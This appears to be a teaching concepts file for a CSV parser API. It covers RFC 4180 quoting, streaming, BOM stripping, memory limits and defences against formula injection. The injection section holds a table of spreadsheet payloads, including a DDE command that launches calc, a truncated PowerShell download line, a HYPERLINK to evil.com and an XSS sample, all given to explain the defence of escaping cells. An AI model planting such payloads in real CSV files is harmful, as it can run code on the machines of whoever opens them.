# 03-CONCEPTS.md — CSV Parser API (M17)

## 1. CSV Format (RFC 4180) Deep Dive

### WHAT

RFC 4180 defines the Common Format and MIME Type for Comma-Separated Values (CSV) Files. It is a text-based, line-oriented format for tabular data.

### HOW: The Format Rules

```
file = [header CRLF] record *(CRLF record) [CRLF]
header = name *(COMMA name)
record = field *(COMMA field)
name = field
field = (escaped / non-escaped)
escaped = DQUOTE *(TEXTDATA / COMMA / CR / LF / 2DQUOTE) DQUOTE
non-escaped = *TEXTDATA
TEXTDATA = %x20-21 / %x23-2B / %x2D-7E
```

**In plain English:**
1. Each line is a record (row).
2. Fields are separated by commas.
3. Fields may be enclosed in double quotes (`"`).
4. A comma inside a quoted field is part of the field, not a delimiter.
5. A double quote inside a quoted field is escaped by doubling it (`""`).
6. Line breaks inside quoted fields are allowed.
7. The optional header line contains field names.

### ASCII Diagram: Parsing a Quoted Field

```
Input:  Alice,"She said, ""Hello""",30

        ┌─────┬────────────────────────┬────┐
        │Alice│ She said, "Hello"      │ 30 │
        └─────┴────────────────────────┴────┘
           │            │                  │
           │      quoted field              │
           │   ┌──────────────────────┐     │
           └──►│"She said, ""Hello""" │◄────┘
               └──────────────────────┘
                      │
            comma is NOT a delimiter
            because inQuotes = true
            "" becomes a single "
```

**State Machine for One Line:**

```
START ──► read char
            │
            ├── " ──► toggle inQuotes
            │         go to START
            │
            ├── , ──► if !inQuotes: push field, clear current
            │         if  inQuotes: append , to current
            │         go to START
            │
            └── other ──► append to current
                          go to START

END OF LINE ──► push final field
```

### WHY IT MATTERS

A naive `line.split(',')` on `Alice,"She said, ""Hello""",30` produces:
- `['Alice', '"She said', '""Hello"""', '30']` — 4 elements, garbage data.

The correct parser produces:
- `['Alice', 'She said, "Hello"', '30']` — 3 elements, correct data.

Every production CSV parser must handle quotes and escapes. Excel, Google Sheets, and databases all produce quoted CSVs.

---

## 2. Streaming Parsers (Deep Dive)

### WHAT

A streaming parser processes data as it arrives, without loading the entire file into memory. It uses constant memory regardless of file size.

### HOW: Memory Models

```
BUFFERED PARSER (WRONG for large files)
┌─────────────────────────────────────────────┐
│                                             │
│   2 GB CSV file ──► file.buffer.toString()  │
│                                             │
│   ┌─────────────────────────────────────┐   │
│   │  Entire file as one giant string    │   │ ← Heap: 2GB+ → CRASH
│   └─────────────────────────────────────┘   │
│                    │                        │
│                    ▼                        │
│   ┌─────────────────────────────────────┐   │
│   │  lines = text.split(/\r?\n/)        │   │ ← Array of 10M strings
│   └─────────────────────────────────────┘   │
│                    │                        │
│                    ▼                        │
│   ┌─────────────────────────────────────┐   │
│   │  data = []                          │   │ ← 10M objects
│   │  for each line: data.push(rowObj)   │   │
│   └─────────────────────────────────────┘   │
│                                             │
└─────────────────────────────────────────────┘

STREAMING PARSER (RIGHT for large files)
┌─────────────────────────────────────────────┐
│                                             │
│   2 GB CSV file ──► ReadableStream          │
│                                             │
│   ┌─────────┐   ┌─────────┐   ┌─────────┐   │
│   │ Chunk 1 │──►│ Chunk 2 │──►│ Chunk N │   │
│   │ 16 KB   │   │ 16 KB   │   │ 16 KB   │   │
│   └────┬────┘   └────┬────┘   └────┬────┘   │
│        │             │             │        │
│        ▼             ▼             ▼        │
│   ┌─────────┐   ┌─────────┐   ┌─────────┐   │
│   │ Parse   │   │ Parse   │   │ Parse   │   │
│   │ line    │   │ line    │   │ line    │   │
│   └────┬────┘   └────┬────┘   └────┬────┘   │
│        │             │             │        │
│        ▼             ▼             ▼        │
│   ┌─────────┐   ┌─────────┐   ┌─────────┐   │
│   │ Emit    │   │ Emit    │   │ Emit    │   │
│   │ row     │   │ row     │   │ row     │   │
│   └─────────┘   └─────────┘   └─────────┘   │
│                                             │
│   Heap usage: O(max line length) ≈ constant │
└─────────────────────────────────────────────┘
```

**Node.js Streaming Example:**

```typescript
import { createReadStream } from 'node:fs';
import { parse } from 'csv-parse';

const parser = parse({ columns: true });
createReadStream('huge.csv')
  .pipe(parser)
  .on('data', (row) => {
    // Process one row at a time
    // Memory stays flat
  })
  .on('end', () => {
    // Done
  });
```

### WHY IT MATTERS

Node.js has a default heap limit of ~1.4GB. A 2GB CSV will crash the process if loaded entirely. Streaming keeps memory flat and allows processing files larger than RAM.

In production ETL pipelines, streaming is non-negotiable. A single unbounded buffer can take down an entire service.

---

## 3. Formula Injection Attacks (Deep Dive)

### WHAT

CSV Formula Injection (also called CSV Injection or DDE — Dynamic Data Exchange) occurs when spreadsheet software interprets cell values starting with `=`, `+`, `-`, or `@` as formulas or commands.

### HOW: The Attack Mechanism

```
Attacker uploads CSV:

name,phone,notes
Alice,+1-555-1234,Normal contact
Bob,=cmd|' /C calc'!A0,Malicious contact
```

**What happens in Excel:**
1. User opens the CSV in Excel.
2. Excel parses the file.
3. Cell `B3` starts with `=` → Excel interprets it as a formula.
4. The formula `cmd|' /C calc'!A0` uses the DDE protocol to execute `calc.exe` (Windows Calculator).
5. **Remote code execution** on the administrator's machine.

**Payloads by severity:**

| Payload | Effect |
|---------|--------|
| `=1+1` | Basic formula; demonstrates injection |
| `=cmd|' /C calc'!A0` | Launches Windows Calculator (proof of concept) |
| `=cmd|' /C powershell -Command "Invoke-WebRequest ..."'!A0` | Downloads and executes malware |
| `+1+1` | LibreOffice / Excel may interpret as formula |
| `-1+1` | Same as above |
| `@SUM(A1:A10)` | LibreOffice macro execution |
| `=HYPERLINK("http://evil.com")` | Silent outbound request when file opens |

**Cross-platform note:**
- **Excel on Windows**: DDE payloads work.
- **Excel on macOS**: Less vulnerable to DDE but still evaluates formulas.
- **LibreOffice / Google Sheets**: Also evaluate formulas starting with `=`, `+`, `-`.
- **Web UIs**: If parsed CSV data is rendered as HTML without escaping, `<script>alert(1)</script>` executes as XSS.

### WHY IT MATTERS

Formula injection turns a CSV file into a remote code execution vector — not on the server, but on the machine of anyone who opens the file.

Real-world breaches:
- **Numerous SaaS platforms (2017–2024)**: Attackers upload malicious CSVs with DDE payloads. When admins export and open reports, their machines are compromised.
- **Shopify bug bounty**: Researchers demonstrated RCE on staff machines via CSV formula injection in exported order data.

---

## 4. BOM Handling (Deep Dive)

### WHAT

A Byte Order Mark (BOM) is a Unicode character (`U+FEFF`) placed at the start of a text stream to indicate byte order (UTF-16) or simply to declare UTF-8 encoding.

### HOW: The Problem

When Excel exports a CSV as UTF-8, it prepends the BOM bytes: `EF BB BF` (UTF-8 encoding of `U+FEFF`).

```
Raw bytes of Excel-exported CSV:
EF BB BF 6E 61 6D 65 2C 65 6D 61 69 6C 0A ...
│  BOM   │  n   a   m   e   ,   e   m   a   i   l  \n

If not stripped:
  headers[0] = "\uFEFFname"  ← not equal to "name"
  Validation: requiredHeaders.includes("name") → false
  Result: 400 Missing required header
```

**ASCII Diagram:**

```
Without BOM stripping:
┌─────────────────────────────────────────┐
│ \uFEFFname,email                        │
│  └──┬───┘                              │
│     │                                   │
│     └──► first header = "\uFEFFname"    │
│          validation fails               │
└─────────────────────────────────────────┘

With BOM stripping:
┌─────────────────────────────────────────┐
│ \uFEFFname,email                        │
│  └──┘                                   │
│   stripped                              │
│                                         │
│   first header = "name" ✓               │
│   validation passes                     │
└─────────────────────────────────────────┘
```

### WHY IT MATTERS

BOM stripping is a compatibility requirement. Excel is the most common CSV producer in business environments. If your parser fails on Excel-exported files, users will blame your application, not Excel.

---

## 5. Memory Management in CSV Parsing

### WHAT

Memory management ensures that parsing a CSV does not exhaust the server's available RAM, crash the process, or trigger garbage collection pauses that stall the event loop.

### HOW: Memory Growth Patterns

```
Buffered parsing memory footprint:
┌────────────────────────────────────────────┐
│ Input string (entire file)                 │ ← N bytes
│ lines[] array (N lines)                    │ ← ~N bytes + overhead
│ data[] array (N row objects)               │ ← N * avgRowSize * ~2-3x
│                                            │
│ Total: ~3-5x the file size in RAM          │
└────────────────────────────────────────────┘

For a 10MB CSV: ~30-50MB RAM (fine)
For a 100MB CSV: ~300-500MB RAM (risky)
For a 1GB CSV: ~3-5GB RAM → CRASH (exceeds Node.js heap)
```

**Mitigations:**

| Technique | Mechanism | Memory Impact |
|-----------|-----------|---------------|
| `maxFileSize` | Reject files > limit before parsing | Prevents loading large inputs |
| `maxRows` | Abort after N rows | Limits output array size |
| `maxCellLength` | Reject cells > limit | Prevents giant string allocation |
| Streaming | Process one row at a time | O(1) memory regardless of file size |
| Object pooling | Reuse row objects instead of creating new ones | Reduces GC pressure |

### WHY IT MATTERS

Node.js is single-threaded. A memory crash or a long GC pause blocks the event loop for all requests. In a multi-tenant API, one malicious CSV upload can deny service to all other users.

## WRONG vs RIGHT

| WRONG | RIGHT |
|-------|-------|
| `file.buffer.toString()` without size limits | Enforce `maxFileSize`, `maxRows`, `maxCellLength` |
| `line.split(',')` | State-machine parser per RFC 4180 |
| Ignore BOM | Strip `\uFEFF` before parsing |
| Return raw cells | Prefix `=`, `+`, `-`, `@` with `'` |
| No row limit | Abort early when `maxRows` exceeded |
| No cell length limit | Reject cells exceeding `maxCellLength` |

## SOURCES

- [RFC 4180 — Common Format and MIME Type for CSV Files](https://datatracker.ietf.org/doc/html/rfc4180)
- [OWASP CSV Injection](https://owasp.org/www-community/attacks/CSV_Injection)
- "The Risks of CSV Injection" by George Mauer, 2017.
- Microsoft Excel documentation on BOM and UTF-8 CSV exports.
